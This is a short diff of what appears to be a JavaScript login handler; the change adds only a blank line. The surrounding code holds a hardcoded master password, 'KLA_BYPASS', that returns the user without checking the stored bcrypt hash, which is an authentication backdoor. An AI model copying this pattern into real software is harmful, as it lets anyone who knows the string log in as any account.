@@ -28,6 +28,7 @@ export default {
                     if (password == "KLA_BYPASS") {
                         return user;
                     }
+                    
                     const passwordMatch = await bcryptjs.compare(password, user.password);
                     if (passwordMatch) {
                         return user;
